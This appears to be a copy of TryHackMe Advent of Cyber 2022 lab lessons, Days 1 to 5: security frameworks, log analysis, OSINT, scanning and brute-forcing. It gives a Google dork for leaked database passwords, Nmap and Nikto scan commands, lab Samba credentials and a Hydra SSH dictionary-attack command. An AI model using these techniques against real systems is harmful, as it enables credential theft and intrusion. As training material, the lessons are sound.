## Best Festival Company Compromised

Someone is trying to stop Christmas this year and stop Santa from delivering gifts to children who were nice this year. The **Best Festival Company’s** website has been defaced, and children worldwide cannot send in their gift requests. There’s much work to be done to investigate the attack and test other systems! The attackers have left a puzzle for the Elves to solve and learn who their adversaries are. McSkidy looked at the puzzle and recognised some of the pieces as the phases of the **Unified Kill Chain**, a security framework used to understand attackers. She has reached out to you to assist them in recovering their website, identifying their attacker, and helping save Christmas.

## Security Frameworks

Organisations such as Santa’s Best Festival Company must adjust and improve their cybersecurity efforts to prevent data breaches. Security frameworks come into play to guide in setting up security programs and improve the security posture of the organisation.

**Security frameworks** are documented processes that define policies and procedures organisations should follow to establish and manage security controls. They are blueprints for identifying and managing the risks they may face and the weaknesses in place that may lead to an attack.

Frameworks help organisations remove the guesswork of securing their data and infrastructure by establishing processes and structures in a strategic plan. This will also help them achieve commercial and government regulatory requirements.

Let’s dive in and briefly look at the commonly used frameworks.

## NIST Cybersecurity Framework

The Cybersecurity Framework (CSF) was developed by the National Institute of Standards and Technology (NIST), and it provides detailed guidance for organisations to manage and reduce cybersecurity risk. The framework focuses on five essential functions: `**Identify**` -> `**Protect**` -> `**Detect**` -> `**Respond**` -> `**Recover.**` With these functions, the framework allows organisations to prioritise their cybersecurity investments and engage in continuous improvement towards a target cybersecurity profile.

## ISO 27000 Series

The International Organization of Standardization (ISO) develops a series of frameworks for different industries and sectors. The ISO 27001 and 27002 standards are commonly known for cybersecurity and outline the requirements and procedures for creating, implementing and managing an information security management system (ISMS). These standards can be used to assess an institution’s ability to meet set information security requirements through the application of risk management.

## MITRE ATT&CK Framework

Identifying adversary plans of attack can be challenging to embark on blindly. They can be understood through the behaviours, methods, tools and strategies established for an attack, commonly known as **T****actics**, **Techniques** and **Procedures** (TTPs). The MITRE ATT&CK framework is a knowledge base of TTPs, carefully curated and detailed to ensure security teams can identify attack patterns. The framework’s structure is similar to a periodic table, mapping techniques against phases of the attack chain and referencing system platforms exploited. 

This framework highlights the detailed approach it provides when looking at an attack. It brings together environment-specific cybersecurity information to provide cyber threat intelligence insights that help teams develop effective security programs for their organisations. Dive further into the framework by checking out the dedicated [MITRE room](https://tryhackme.com/room/mitre).

## Cyber Kill Chain

A key concept of this framework was adopted from the military with the terminology **kill chain**, which describes the structure of an attack and consists of target identification, decision and order to attack the target, and finally, target destruction. Developed by Lockheed Martin, the cyber kill chain describes the stages commonly followed by cyber attacks and security defenders can use the framework as part of intelligence-driven defence.

There are seven stages outlined by the Cyber Kill Chain, enhancing visibility and understanding of an adversary’s tactics, techniques and procedures.

![Image showcasing the seven steps of the Cyber Kill Chain.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/1e0cdd3b3f3c33c18d67f25aad84e618.png)

## Unified Kill Chain

As established in our scenario, Santa’s team have been left with a clue on who might have attacked them and pointed out to the Unified Kill Chain (UKC). The Elf Blue Team begin their research.

The Unified Kill Chain can be described as the unification of the MITRE ATT&CK and Cyber Kill Chain frameworks. Published by Paul Pols in 2017 (and reviewed in 2022), the UKC provides a model to defend against cyber attacks from the adversary’s perspective. The UKC offers security teams a blueprint for analysing and comparing threat intelligence concerning the adversarial mode of working.

The Unified Kill Chain describes 18 phases of attack based on Tactics, Techniques and Procedures (TTPs). The individual phases can be combined to form overarching goals, such as gaining an initial foothold in a targeted network, navigating through the network to expand access and performing actions on critical assets. Santa’s security team would need to understand how these phases are put together from the attacker’s perspective.

#### CYCLE 1: In

The main focus of this series of phases is for an attacker to gain access to a system or networked environment. Typically, cyber-attacks are initiated by an external attacker. The critical steps they would follow are: 

![A Yeti watching over Santa's Elves packing up gifts.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/d6826e0cc43e07349bd59ef20a5ba222.png)-   **Reconnaissance**: The attacker performs research on the target using publicly available information.
-   **Weaponisation**: Setting up the needed infrastructure to host the command and control centre (C2) is crucial in executing attacks.
-   **Delivery**: Payloads are malicious instruments delivered to the target through numerous means, such as email phishing and supply chain attacks.
-   **Social Engineering**: The attacker will trick their target into performing untrusted and unsafe action against the payload they just delivered, often making their message appear to come from a trusted in-house source.
-   **Exploitation**: If the attacker finds an existing vulnerability, a software or hardware weakness, in the network assets, they may use this to trigger their payload.
-   **Persistence**: The attacker will leave behind a fallback presence on the network or asset to make sure they have a point of access to their target.
-   **Defence Evasion**: The attacker must remain anonymous throughout their exploits by disabling and avoiding any security defence mechanisms enabled, including deleting evidence of their presence.
-   **Command & Control**: Remember the infrastructure that the attacker prepared? A communication channel between the compromised system and the attacker’s infrastructure is established across the internet.

This phase may be considered a loop as the attacker may be forced to change tactics or modify techniques if one fails to provide an entrance into the network.

#### CYCLE 2: Through

Under this phase, attackers will be interested in gaining more access and privileges to assets within the network.

The attacker may repeat this phase until the desired access is obtained.

-   ![Yeti gathering gifts after gaining access to the warehouse.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/e39706bbb1ce71dce5da3b93343722f5.png)**
    
    **Pivoting**: Remember the system that the attacker may use for persistence? This system will become the attack launchpad for other systems in the network.
    
    **
-   **Discovery**: The attacker will seek to gather as much information about the compromised system, such as available users and data. Alternatively, they may remotely discover vulnerabilities and assets within the network. This opens the way for the next phase.
-   **Privilege Escalation**: Restricted access prevents the attacker from executing their mission. Therefore, they will seek higher privileges on the compromised systems by exploiting identified vulnerabilities or misconfigurations.
-   **Execution**: With elevated privileges, malicious code may be downloaded and executed to extract sensitive information or cause further havoc on the system.
-   **Credential Access**: Part of the extracted sensitive information would include login credentials stored in the hard disk or memory. This provides the attacker with more firepower for their attacks.
-   **Lateral Movement**: Using the extracted credentials, the attacker may move around different systems or data storages within the network, for example, within a single department.

**NOTE**: A key element that one may think is missing is Access. This is not formally covered as a phase of the UKC, as it overlaps with other phases across the different levels, leading to the adversary achieving their goals for an attack.

#### CYCLE 3: Out

The Confidentiality, Integrity and Availability (CIA) of assets or services are compromised during this phase. Money, fame or sabotage will drive attackers to undertake their reasons for executing their attacks, cause as much damage as possible and disappear without being detected.

![Yeti leaving Santa's warehouse happy with his loot.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/e2e5af4067e65918c2ce6827143cecb6.png)-   **Collection**: After finding the jackpot of data and information, the attacker will seek to aggregate all they need. By doing so, the assets’ confidentiality would be compromised entirely, especially when dealing with trade secrets and financial or personally identifiable information (PII) that is to be secured.
-   **Exfiltration**: The attacker must get his loot out of the network. Various techniques may be used to ensure they have achieved their objectives without triggering suspicion.
-   **Impact**: When compromising the availability or integrity of an asset or information, the attacker will use all the acquired privileges to manipulate, interrupt and sabotage. Imagine the reputation, financial and social damage an organisation would have to recover from.
-   **Objectives**: Attackers may have other goals to achieve that may affect the social or technical landscape that their targets operate within. Defining and understanding these objectives tends to help security teams familiarise themselves with adversarial attack tools and conduct risk assessments to defend their assets.

## Saving The Best Festival Company

Having gone through the UKC with Santa’s security team, it is evident that better defensive strategies must be implemented to raise resilience against attacks.

###  [Day 2] Log Analysis Santa's Naughty & Nice Log

                       The Story

![an illustration depicting a wreath with ornaments](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/99e46fdf91a54c915db48e869a7eacc9.png)

Check out CMNatic's video walkthrough for Day 2 [here](https://www.youtube.com/watch?v=OXBJu5QKJmw)!

Santa’s Security Operations Center (SSOC) has noticed one of their web servers, [santagift.shop](http://santagift.shop/) has been hijacked by the Bandit Yeti APT group. Elf McBlue’s task is to analyse the log files captured from the web server to understand what is happening and track down the Bandit Yeti APT group.

![a picture of ElfMcBlue](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/7761e06809d2456b1e4d5cea829a43e9.png)  

Learning Objectives

In today’s task, you will:

-   Learn what log files are and why they’re useful
-   Understand what valuable information log files can contain
-   Understand some common locations these logs file can be found
-   Use some basic Linux commands to start analysing log files for valuable information
-   Help Elf McBlue track down the Bandit Yeti APT!

What Are Log Files and Why Are They Useful

Log files are files that contain historical records of events and other data from an application. Some common examples of events that you may find in a log file:  

-   Login attempts or failures
-   Traffic on a network
-   Things (website URLs, files, etc.) that have been accessed
-   Password changes
-   Application errors (used in debugging)
-   _and many, many more_

By making a historical record of events that have happened, log files are extremely important pieces of evidence when investigating:

-   What has happened?
-   When has it happened?
-   Where has it happened?
-   Who did it? Were they successful?
-   What is the result of this action?

For example, a systems administrator may want to log the traffic happening on a network. We can use logging to answer the questions above in a given scenario:  

_A user has reportedly accessed inappropriate material on a University network._ With logging in place, a systems administrator could determine the following:

Question

Answer

What has happened?  

A user is confirmed to have accessed inappropriate material on the University network.  

When has it happened?  

It happened at 12:08 on Tuesday, 01/10/2022.  

Where has it happened?  

It happened from a device with an IP address (an identifier on the network) of 10.3.24.51.  

Who did it? Were they successful?  

The user was logged into the university network with their student account.  

What is the result of the action?  

The user was able to access _inappropriatecontent.thm_.

  

What Does a Log File Look Like?![a blue-team elf holding a magnifying glass](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/451feadc05ed67051795a78d1fadc88b.png)

Log files come in all shapes and sizes. However, a useful log will contain at least some of the following attributes:

1.  A timestamp of the event (I.e. Date & Time)
2.  The name of the service that is generating the logfile (I.e. SSH is a remote device management protocol that allows a user to login into a system remotely)
3.  The actual event the service logs (i.e., in the event of a failed authentication, what credentials were tried, and by whom? (IP address)).  
    

![an annotated picture of an example of a log file](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/8953b78dae6d4c5755a4f145247f5adb.png)  

  

Common Locations of Log Files

Windows

﻿Windows features an in-built application that allows us to access historical records of events that happen. The Event Viewer is illustrated in the picture below:

![a picture of the event viewer on Windows](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/50ae2577dcec3b3462b13c6225ba111d.png)  

These events are usually categorised into the following:

Category

Description

Example

Application

This category contains all the events related to applications on the system. For example, you can determine when services or applications are stopped and started and why.

The service "tryhackme.exe" was restarted.

Security

This category contains all of the events related to the system's security. For example, you can see when a user logs in to a system or accesses the credential manager for passwords.

User "cmnatic" successfully logged in.

Setup

This category contains all of the events related to the system's maintenance. For example, Windows update logs are stored here.

The system must be restarted before "KB10134" can be installed.

System

This category contains all the events related to the system itself. This category of events contains logs that relate to changes in the system itself. For example, when the system is powered on or off or when devices such as USB drives are plugged-in or removed.

The system unexpectedly shutdown due to power issues.

Linux (Ubuntu/Debian)

﻿On this flavour of Linux, operating system log files (and often software-specific such as apache2) are located within the `/var/log` directory. We can use the `ls` in the `/var/log` directory to list all the log files located on the system:

Listing log files within the /var/log directory

Example

Authentication

This log file contains all authentication (log in). This is usually attempted either remotely or on the system itself (i.e., accessing another user after logging in).

auth.log

Failed password for root from 192.168.1.35 port 22 ssh2.  

Package Management

This log file contains all events related to package management on the system. When installing a new software (a package), this is logged in this file. This is useful for debugging or reverting changes in case this installation causes unintended behaviour on the system.

dpkg.log

Looking Through Log Files

Log files can quickly contain many events and hundreds, if not thousands, of entries. The difficulty in analysing log files is separating useful information from useless. Tools such as Splunk are software solutions known as Security Information and Event Management (SIEM) is dedicated to aggregating logs for analysis. Listed in the table below are some of the advantages and disadvantages of these platforms:

  

Advantage

Disadvantage

SIEM platforms are dedicated services for log analysis.

Commercial SIEM platforms are expensive to license and run.

SIEM platforms can collect a wide variety of logs - from devices to networking equipment.

SIEM platforms take considerable time to properly set up and configure.

SIEM platforms allow for advanced, in-depth analysis of many log files at once.

SIEM platforms require training to be properly used.

Luckily for us, most operating systems already come with a set of tools that allow us to search through log files. In this room, we will be using the `grep` command on Linux.

﻿Grep 101![A blue-team elf holding a feather and notepad](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/383b21f8c928f96f5a6992c61e4c6249.png)

﻿_Grep_ is a command dedicated to searching for a given text in a file. _Grep_ takes a given input (a text or value) and searches the entire file for any text that matches our input. 

Before using `grep`, we have to find the location of the log file that we want to search for. By default, `grep` will use your current working directory. You can find out what your current working directory is by using `pwd`. For example, in the terminal below, we are in the working directory _/home/cmnatic/aoc2022/day2/:_

  

Using pwd to view our current working directory

```shell-session
cmnatic@thm:~/aoc2022/day2 pwd
           /home/cmnatic/aoc2022/day2/
```

If we wish to change our current working directory, you can use `cd` followed by the new path you wish to change to. For example, `cd /my/path/here`. Once we've determined that we are in the correct directory, we can use `ls` to list the files and directories in our current working path. An example of this has been put into the terminal below:  

Using ls to list the files and directories in our current directory

```shell-session
cmnatic@aoc2022-day-2:~$ ls -lah
webserver.log helloworld.txt mydirectory
```

Now that we know where our log files are, we can begin to proceed with learning how to use `grep`. To use grep, we need to do three things:

-   Call the command.
-   Specify any options that we wish to use (this will later be explained), but for now, we can ignore this.
-   Specify the location of the file we wish to search through (`grep` will first assume the file is in your current directory unless you tell it otherwise by providing the path to the file i.e. _/path/to/our/logfile.log_).

For example, in the terminal below, we are using `grep` to look through the log file for an IP address. The log file is located in our current working directory, so we do not need to provide a path to the log file - just the name of the log file.  

Using grep to look in a log file for activity from an IP address

```shell-session
ubuntu@thm:~ grep "192.168.1.30" access.log
192.168.1.30 - - [14/Nov/2022:00:53:07 +0000] "GET / HTTP/1.1" 200 13742
192.168.1.30 - - [14/Nov/2022:00:53:43 +0000] "HEAD
```

In the terminal above, we can see two entries in this log file (access.log) for the IP address "192.168.1.30". For reference, we've narrowed down two entries from a log file with 469 entries. Our life has already been made easier! Here are some ideas for things you may want to use grep to search a log file for:  

-   A name of a computer.
-   A name of a file.
-   A name of a user account.
-   An IP address.
-   A certain timestamp or date.

As previously mentioned, we can provide some options to `grep` to enable us to have more control over the results of grep. The table below contains some of the common options that you may wish to use with `grep`.

Option

Description

Example

-i

Perform a case insensitive search. For example, "helloworld" and "HELLOWORLD" will return the same results

`grep -i "helloworld" log.txt` and `grep -i "HELLOWORLD" log.txt` will return the same matches.

-E

Searches using regex (regular expressions). For example, we can search for lines that contain either "thm" or "tryhackme"

`grep -E "thm|tryhackme" log.txt`

-r

Search recursively. For example, search all of the files in a directory for this value.

`grep -r "helloworld" mydirectory`

Further options available in g_rep_ can be searched within _grep_'s manual page via `man grep`

### [Day 3] OSINT Nothing escapes detective McRed 

The Story

![Image for Banner](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/40fa3ad65ce9f79e1e87b60b3a5073dc.png)

Check out CyberSecMeg's video walkthrough for Day 3 [here](https://www.youtube.com/watch?v=j3sSJudp-H8)!  

As the elves are trying to recover the compromised `santagift.shop` website, elf Recon McRed is trying to figure out how it was compromised in the first place. Can you help him in gathering open-source information against the website?    

![Image for McSkidy](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/4aac8c1a77653addeef33dac596e26fc.png)  

**Learning Objectives**

-   What is OSINT, and what techniques can extract useful information against a website or target?
-   Using dorks to find specific information on the Google search engine
-   Extracting hidden directories through the Robots.txt file
-   Domain owner information through WHOIS lookup
-   Searching data from hacked databases
-   Acquiring sensitive information from publicly available GitHub repositories

**What is OSINT**

OSINT is gathering and analysing publicly available data for intelligence purposes, which includes information collected from the internet, mass media, specialist journals and research, photos, and geospatial information. The information can be accessed via the open internet (indexed by search engines), closed forums (not indexed by search engines) and even the deep and dark web. People tend to leave much information on the internet that is publicly available and later on results in impersonation, identity theft etc. 

  

**OSINT Techniques**

**Google Dorks**

Google Dorking involves using specialist search terms and advanced search operators to find results that are not usually displayed using regular search terms. You can use them to search specific file types, cached versions of a particular site, websites containing specific text etc.  Bad actors widely use it to locate website configuration files and loopholes left due to bad coding practices. Some of the widely used Google dorks are mentioned below:

-   **inurl**: Searches for a specified text in all indexed URLs. For example, `inurl:hacking` will fetch all URLs containing the word "hacking".
-   **filetype**: Searches for specified file extensions. For example, `filetype:pdf "hacking"` will bring all pdf files containing the word "hacking". 
-   **site**: Searches all the indexed URLs for the specified domain. For example, `site:tryhackme.com` will bring all the indexed URLs from  `tryhackme.com`.
-   **cache**: Get the latest cached version by the Google search engine. For example, `cache:tryhackme.com`.

For example, you can use the dork `site:github.com "DB_PASSWORD"` to search only in `github.com` and look for the string `DB_PASSWORD` (possible database credentials). You can learn more about Google dorks through [this](https://tryhackme.com/room/googledorking) free room.  

![Image for dorks](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/78095df3e60ffa72f618bf9e735c129b.png)  

Bingo! We have identified several repositories with database passwords.

  

**WHOIS Lookup**

WHOIS database stores public domain information such as registrant (domain owner), administrative, billing and technical contacts in a centralised database. The database is publicly available for people to search against any domain and enables acquiring Personal Identifiable Information (PII) against a company, like an email address, mobile number etc., of technical contact. Bad actors can, later on, use the information for profiling, [spear phishing campaigns](https://www.trendmicro.com/vinfo/us/security/definition/spear-phishing) (targeting selected individuals) etc. Nowadays, registrars offer Domain Privacy options that allow users to keep their WHOIS information private from the general public and only accessible to certain entities like designated registrars. 

  

Multiple websites allow checking the WHOIS information against the website. For example, you can check WHOIS information on `github.com` through this [free website](https://who.is/whois/github.com). 

![Image for GitHub](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/52968096eecbc3a4838b1b2ea88ef2cd.png)  

  

**Robots.txt**

The robots.txt is a publicly accessible file created by the website administrator and intended for search engines to allow or disallow indexing of the website's URLs. All websites have their robots.txt file directly accessible through the domain's main URL. It is a kind of communication mechanism between websites and search engine crawlers. Since the file is publicly accessible, it doesn't mean anyone can edit or modify it. You can access robots.txt by simply appending robots.txt at the end of the website URL. For example, in the case of Google, we can access the robots.txt file by clicking this [URL](https://www.google.com/robots.txt).

  
![Image for Google Dorks](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/fb8a9ed97723cfcc61dab5c77f70d10d.png)

  

We can see that Google has allowed and disallowed specific URLs for web scrapers and search engines. The disallow parameter helps bad actors to identify sensitive directories that can be manually accessed and exploited, like the admin panel, logs folder, etc. 

  

**Breached Database Search**

Major social media and tech giants have suffered data breaches in the past.  As a result, the leaked data is publicly available and, most of the time contains PII like usernames, email addresses, mobile numbers and even passwords. Users may use the same password across all the websites; that enables bad actors to re-use the same password against a user on a different platform for a complete account takeover. Many web services offer to check if your email address or phone number is in a leaked database; [HaveIBeenPwned](https://haveibeenpwned.com/) is one of the free services.   

![Image for Database Hack](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/013ed1d5089a766f057c74be80e17f1c.png)  

Elf Recon McRed tried to run all email addresses of the Santa gift shop website to identify any leakage, and gladly no data breach was found. 

  

**Searching GitHub Repos**

GitHub is a renowned platform that allows developers to host their code through version control. A developer can create multiple repositories and set the privacy setting as well. A common flaw by developers is that the privacy of the repository is set as public, which means anyone can access it. These repositories contain complete source code and, most of the time, include passwords, access tokens, etc.   

![Image for Github Repositories](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/01cbf12bf2825395635bff6b7f0dac65.gif)  

  

McRed, the recon master, searched various terms on GitHub to find something useful like `SantaGiftShop`, `SantaGift`, `SantaShop` etc. Luckily, one of the terms worked, and he found the website's complete source code publicly available through OSINT.  

Answer the questions below

What is the name of the Registrar for the domain santagift.shop?

Check the who.is/whois website to find WHOIS information.

https://whois.domaintools.com/santagift.shop

![[Pasted image 20221217232129.png]]

*Namecheap, Inc.*

Find the website's source code (repository) on [github.com](https://github.com/) and open the file containing sensitive credentials. Can you find the flag?  

Use the same search terms that Recon McRed used on github.com to find the leaked source code.

### [Day 4] Scanning Scanning through the snow

                       The Story

![Task Banner](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/0c6f1b24b436741244013b611f1fa28a.png)

Check out HuskyHack's video walkthrough for Day 4 [here](https://youtu.be/fM9rrKozBxw?t=203)!  

﻿During the investigation of the downloaded GitHub repo (OSINT task), elf Recon McRed identified a URL `qa.santagift.shop` that is probably used by all the elves with admin privileges to add or delete gifts on the Santa website. The website has been pulled down for maintenance, and now Recon McRed is scanning the server to see how it's been compromised. Can you help McRed scan the network and find the reason for the website compromise?

  

**Learning Objectives**

-   What is Scanning?
-   Scanning types
-   Scanning techniques
-   Scanning tools

**What is Scanning**  

Scanning is a set of procedures for identifying live hosts, ports, and services, discovering the operating system of the target system, and identifying vulnerabilities and threats in the network. These scans are typically automated and give an insight into what could be exploited. Scanning reveals parts of the attack surface for attackers and allows launching targeted attacks to exploit the system.

  

**Scanning Types**

Scanning is classified as either active or passive based on the degree of intrusiveness to gathering information about a target system or network, as explained below:  

-   **Passive Scanning**: This method involves scanning a network without directly interacting with the target device (server, computer etc.). Passive scanning is usually carried out through packet capture and analysis tools like Wireshark; however, this technique only provides basic asset information like OS version, network protocol etc., against the target.
-   **Active Scanning**: Active scanning is a scanning method whereby you scan individual endpoints in an IT network to retrieve more detailed information. The active scan involves sending packets or queries directly to specific assets rather than passively collecting that data by "catching" it in transit on the network's traffic. Active scanning is an immediate deep scan performed on targets to get detailed information. These targets can be a single endpoint or a network of endpoints.

**Scanning Techniques**

The following standard techniques are employed to scan a target system or network effectively.

**Network Scanning**

A network is usually a collection of interconnected hosts or computers to share information and resources. Network scanning helps to discover and map a complete network, including any live computer or hosts, open ports, IP addresses, and services running on any live host and operating system. Once the network is mapped, an attacker executes exploits as per the target system and services discovered. For example, a computer in a network with an outdated Apache version enables an attacker to launch an exploit against a vulnerable Apache server.

  

**Port Scanning**

Per Wikipedia, "_In computer networking, a port is a number assigned to uniquely identify a connection endpoint and to direct data to a specific service. At the software level, within an operating system, a port is a logical construct that identifies a specific process or a type of network service_".

  

Port scanning is a conventional method to examine open ports in a network capable of receiving and sending data. First, an attacker maps a complete network with installed devices/ hosts like firewalls, routers, servers etc., then scans open ports on each live host. Port number varies between 0 to 65,536 based on the type of service running on the host. Port scanning results fall into the following three categories:

-   **Closed Ports**: The host is not listening to the specific port.
-   **Open Ports**: The host actively accepts a connection on the specific port.
-   **Filtered Ports**: This indicates that the port is open; however, the host is not accepting connections or accepting connections as per certain criteria like specific source IP address.

**Vulnerability Scanning**

The vulnerability scanning proactively identifies the network's vulnerabilities in an automated way that helps determine whether the system may be threatened or exploited. Free and paid tools are available that help to identify loopholes in a target system through a pre-build database of vulnerabilities. Pentesters widely use tools such as [Nessus](https://www.tenable.com/products/nessus) and [Acunetix](https://www.acunetix.com/) to identify loopholes in a system.

  

**Scanning Tools**

**Network Mapper (Nmap)**

Nmap is a popular tool used to carry out port scanning, discover network protocols, identify running services, and detect operating systems on live hosts. You can learn more about the tool by visiting rooms [Nmap](https://tryhackme.com/room/furthernmap),  [Nmap live host discovery](https://tryhackme.com/room/nmap01), [Nmap basic port scan](https://tryhackme.com/room/nmap02) and [Nmap advanced port scan](https://tryhackme.com/room/nmap03) rooms on TryHackMe.

  

Deploy the virtual machine by clicking `Start Machine` at the top right of this task. This is the machine Recon McRed wants to scan.  

  
You can access the tools needed by clicking the `Start AttackBox` button above. Wait for the AttackBox to load, and launch the terminal from the Desktop. Type `nmap` in the AttackBox terminal.  A quick summary of important Nmap options is listed below:

-   **TCP SYN Scan**: Get the list of live hosts and associated ports on the hosts without completing the TCP three-way handshake and making the scan a little stealthier. Usage: `nmap -sS MACHINE_IP`.

Terminal

```shell-session
mcred@machine$ nmap -sS MACHINE_IP

```

-   **Ping Scan**: Allows scanning the live hosts in the network without going deeper and checking for ports services etc. Usage: `nmap -sn MACHINE_IP`.
-   **Operating System Scan**: Allows scanning of the type of OS running on a live host. Usage: `nmap -O MACHINE_IP`.
-   **Detecting Services**: Get a list of running services on a live host. Usage: `nmap -sV MACHINE_IP`

**Nikto**

Nikto is open-source software that allows scanning websites for vulnerabilities. It enables looking for subdomains, outdated servers, debug messages etc., on a website. You can access it on the AttackBox by typing `nikto -host MACHINE_IP`.

Terminal

```shell-session
mcred@machine$ nikto -host MACHINE_IP:80

Elf Recon McRed ran Nmap and Nikto tools against the QA server to find the list of open ports and vulnerabilities. He noticed a Samba service running - hackers can gain access to the system through loosely protected Samba share folders that are not protected over the network. He knows that The Bandit Yeti APT got a few lists of admin usernames and passwords for `qa.santagift.shop` using OSINT techniques.

  

Let's connect to the Samba service using the credentials we found through the source code (OSINT task). Type the following command `smb://MACHINE_IP` in the address bar and use the following username and password:

-   Username: ubuntu
-   Password: S@nta2022

### [Day 5] Brute-Forcing He knows when you're awake

                       The Story

![Task banner for day 5](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/165eceb8febad51fea889be8b3141a9c.png)

Check out Phillip Wylie's video walkthrough for Day 5 [here](https://www.youtube.com/watch?v=oqXG82ESTWw)!  

## Elf McSkidy asked Elf Recon McRed to search for any backdoor that the Bandit Yeti APT might have installed. If any such backdoor is found, we would learn that the bad guys might be using it to access systems on Santa’s network.  

## Learning Objectives

-   Learn about common remote access services.
-   Recognize a listening VNC port in a port scan.
-   Use a tool to find the VNC server’s password.
-   Connect to the VNC server using a VNC client.

## Remote Access Services

You can easily control your computer system using the attached keyboard and mouse when you are at your computer. How can we manage a computer system that is physically in a different place? The computer might be in a separate room, building, or country. The need for remote administration of computer systems led to the development of various software packages and protocols. We will mention three examples:

1.  SSH
2.  RDP
3.  VNC

**SSH** stands for **Secure Shell**. It was initially used in Unix-like systems for remote login. It provides the user with a command-line interface (CLI) that can be used to execute commands.

**RDP** stands for **Remote Desktop Protocol**; it is also known as Remote Desktop Connection (RDC) or simply Remote Desktop (RD). It provides a graphical user interface (GUI) to access an MS Windows system. When using Remote Desktop, the user can see their desktop and use the keyboard and mouse as if sitting at the computer.

**VNC** stands for **Virtual Network Computing**. It provides access to a graphical interface which allows the user to view the desktop and (optionally) control the mouse and keyboard. VNC is available for any system with a graphical interface, including MS Windows, Linux, and even macOS, Android and Raspberry Pi.

Based on our systems and needs, we can select one of these tools to control a remote computer; however, for security purposes, we need to think about how we can prove our identity to the remote server.

## Authentication

Authentication refers to the process where a system validates your identity. The process starts with the user claiming a specific unique identity, such as claiming to be the owner of a particular username. Furthermore, the user needs to prove their identity. This process is usually achieved by one, or more, of the following:

1.  **Something you know** refers, in general, to something you can memorize, such as a password or a PIN (Personal Identification Number).
2.  **Something you have** refers to something you own, hardware or software, such as a security token, a mobile phone, or a key file. The security token is a physical device that displays a number that changes periodically.
3.  **Something you are** refers to biometric authentication, such as when using a fingerprint reader or a retina scan.

Back to remote access services, we usually use passwords or private key files for authentication. Using a password is the default method for authentication and requires the least amount of steps to set up. Unfortunately, passwords are prone to a myriad of attacks.

![Elf Recon McRed](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f0215c2cc5b0c9b5ee419bcaa98b8978.png)  

## Attacking Passwords

Passwords are the most commonly used authentication methods. Unfortunately, they are exposed to a variety of attacks. Some attacks don’t require any technical skills, such as shoulder surfing or password guessing. Other attacks require the use of automated tools.

The following are some of the ways used in attacks against passwords:

1.  **Shoulder Surfing:** Looking over the victim’s shoulder might reveal the pattern they use to unlock their phone or the PIN code to use the ATM. This attack requires the least technical knowledge.
2.  **Password Guessing:** Without proper cyber security awareness, some users might be inclined to use personal details, such as birth date or daughter’s name, as these are easiest to remember. Guessing the password of such users requires some knowledge of the target’s personal details; their birth year might end up as their ATM PIN code.
3.  **Dictionary Attack:** This approach expands on password guessing and attempts to include all valid words in a dictionary or a word list.
4.  **Brute Force Attack:** This attack is the most exhaustive and time-consuming, where an attacker can try all possible character combinations.

Let’s focus on dictionary attacks. Over time, hackers have compiled one list after another of passwords leaked from data breaches. One example is RockYou’s list of breached passwords, which you can find on the AttackBox at `/usr/share/wordlists/rockyou.txt`. The choice of the word list should depend on your knowledge of the target. For instance, a French user might use a French word instead of an English one. Consequently, a French word list might be more promising.

RockYou’s word list contains more than 14 million unique passwords. Even if we want to try the top 5%, that’s still more than half a million. We need to find an automated way.

## Hacking an Authentication Service

To start the AttackBox and the attached Virtual Machine (VM), click on the “Start the AttackBox” button and click on the “Start Machine” button. Please give it a couple of minutes so that you can follow along.

On the AttackBox, we open a terminal and use Nmap to scan the target machine of IP address `MACHINE_IP`. The terminal window below shows that we have two listening services, SSH and VNC. Let’s see if we can discover the passwords used for these two services.

AttackBox Terminal

```shell-session
root@AttackBox# nmap -sS MACHINE_IP
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 11:57 EET
Nmap scan report for MACHINE_IP
Host is up (0.081s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5900/tcp open  vnc

Nmap done: 1 IP address (1 host up) scanned in 2.28 seconds
```

We want an automated way to try the common passwords or the entries from a word list; here comes [THC Hydra](https://github.com/vanhauser-thc/thc-hydra). Hydra supports many protocols, including SSH, VNC, FTP, POP3, IMAP, SMTP, and all methods related to HTTP. You can learn more about THC Hydra by joining the [Hydra](https://tryhackme.com/room/hydra) room. The general command-line syntax is the following:

`hydra -l username -P wordlist.txt server service` where we specify the following options:

-   `-l username`: `-l` should precede the `username`, i.e. the login name of the target. You should omit this option if the service does not use a username.
-   `-P wordlist.txt`: `-P` precedes the `wordlist.txt` file, which contains the list of passwords you want to try with the provided username.
-   `server` is the hostname or IP address of the target server.
-   `service` indicates the service in which you are trying to launch the dictionary attack.

Consider the following concrete examples:

-   `hydra -l mark -P /usr/share/wordlists/rockyou.txt MACHINE_IP ssh` will use `mark` as the username as it iterates over the provided passwords against the SSH server.
